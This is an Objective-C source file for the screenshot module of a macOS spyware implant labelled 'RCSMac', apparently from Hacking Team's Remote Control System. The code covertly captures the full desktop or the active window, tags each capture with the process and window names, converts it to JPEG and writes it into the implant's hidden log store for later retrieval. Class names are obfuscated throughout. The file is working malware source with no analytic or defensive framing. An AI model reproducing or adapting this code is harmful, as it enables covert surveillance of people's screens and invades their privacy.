/*
 * RCSMac - Screenshot agent
 * 
 *
 * Created by Alfredo 'revenge' Pesoli on 23/04/2009
 *  Modified by Massimo Chiodini
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSMAgentScreenshot.h"

#import "RCSMCommon.h"
#import "RCSMLogger.h"
#import "RCSMDebug.h"


static __m_MAgentScreenshot *sharedAgentScreenshot = nil;

// See SonOfGrab! http://developer.apple.com/samplecode/SonOfGrab/listing3.html

@interface __m_MAgentScreenshot (hidden)

- (BOOL)_grabScreenshot: (BOOL)entireDesktop;

@end

@implementation __m_MAgentScreenshot (hidden)

- (BOOL)_grabScreenshot: (BOOL)entireDesktop
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  screenshotAdditionalStruct *agentAdditionalHeader;
  
  CGImageRef screenShot;
  NSBitmapImageRep *bitmapRep;
  NSMutableData *imageData;
  NSString *processName;
  NSString *windowName;
  
  if (entireDesktop == YES) 
    {
#ifdef DEBUG_SCREENSHOT
      infoLog(@"Grabbing entire desktop");
#endif

      screenShot = CGWindowListCreateImage(CGRectInfinite,
                                           kCGWindowListOptionOnScreenOnly,
                                           kCGNullWindowID,
                                           kCGWindowImageDefault);
      processName = [[NSString alloc] initWithString: @"Desktop"];
      windowName  = [[NSString alloc] initWithString: @"Desktop"];
    }
  else 
    {
#ifdef DEBUG_SCREENSHOT
      infoLog(@"Grabbing foreground windows");
#endif

      NSDictionary *windowInfo;
      
      //
      // Looks like it's better to wait at least a second in order to be sure
      // to get the window on the desktop in case of onProcess->Screenshot
      //
      sleep(1);
      
      if ((windowInfo = getActiveWindowInfo()) == nil)
        {
#ifdef DEBUG_SCREENSHOT
          errorLog(@"Error while getting active window info");
#endif
          return NO;
        }
      
      if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
        {
#ifdef DEBUG_SCREENSHOT
          errorLog(@"windowID is empty");
#endif
          return NO;
        }
      
      screenShot = CGWindowListCreateImage(CGRectNull,
                                           kCGWindowListOptionIncludingWindow,
                                           [[windowInfo objectForKey: @"windowID"] unsignedIntValue],
                                           kCGWindowImageBoundsIgnoreFraming);
      
      processName = [[windowInfo objectForKey: @"processName"] retain];
      windowName  = [[windowInfo objectForKey: @"windowName"] retain];
      
      //[windowInfo release];
    }
  
  if (screenShot == NULL)
    {
      return NO;
    }
  
  bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
  NSData *tempData = [bitmapRep representationUsingType: NSJPEGFileType
                                             properties: nil];
  imageData = [NSMutableData dataWithData: tempData];
  
  //
  // Fill in the agent additional header
  //
  NSMutableData *rawAdditionalHeader = [NSMutableData dataWithLength: sizeof(screenshotAdditionalStruct) +
                                                                      [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] +
                                                                      [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  int processNameLength = [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  int windowNameLength  = [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  agentAdditionalHeader = (screenshotAdditionalStruct *)[rawAdditionalHeader bytes];
  
  agentAdditionalHeader->version = LOG_SCREENSHOT_VERSION;
  agentAdditionalHeader->processNameLength = processNameLength;
  agentAdditionalHeader->windowNameLength  = windowNameLength;

  // Unfortunately we have to use replaceBytesInRange and mess with size
  // instead of doing a raw appendData
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct), processNameLength)
                                 withBytes: [[processName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct) + processNameLength, windowNameLength)
                                 withBytes: [[windowName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
#ifdef DEBUG_SCREENSHOT
  verboseLog(@"additionalHeader: %@", rawAdditionalHeader);
#endif
  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
  
  BOOL success = [logManager createLog: AGENT_SCREENSHOT
                           agentHeader: rawAdditionalHeader
                             withLogID: 0];
  
  if (success == TRUE)
    {
#ifdef DEBUG_SCREENSHOT
      verboseLog(@"logHeader created correctly");
#endif
      if ([logManager writeDataToLog: imageData
                            forAgent: AGENT_SCREENSHOT
                           withLogID: 0] == TRUE)
        {
#ifdef DEBUG_SCREENSHOT
          infoLog(@"data written correctly");
#endif        
        }

      [logManager closeActiveLog: AGENT_SCREENSHOT
                       withLogID: 0];
    }
  
  [bitmapRep release];
  CGImageRelease(screenShot);
  
  [processName release];
  [windowName release];
  
  [outerPool release];
  return YES;
}

@end

@implementation __m_MAgentScreenshot

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentScreenshot *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentScreenshot == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentScreenshot;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentScreenshot == nil)
      {
        sharedAgentScreenshot = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentScreenshot;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  screenshotStruct *screenshotRawData;
  screenshotRawData = (screenshotStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
  BOOL grabEntireDesktop = (screenshotRawData->grabActiveWindow == 0)  ? TRUE : FALSE;
   
  [self _grabScreenshot: grabEntireDesktop];
  
  [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];

  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;

  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= mSleepSec)
    {
      internalCounter++;
      sleep(1);
    }
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
    {
      [mAgentConfiguration release];
      mAgentConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

@end
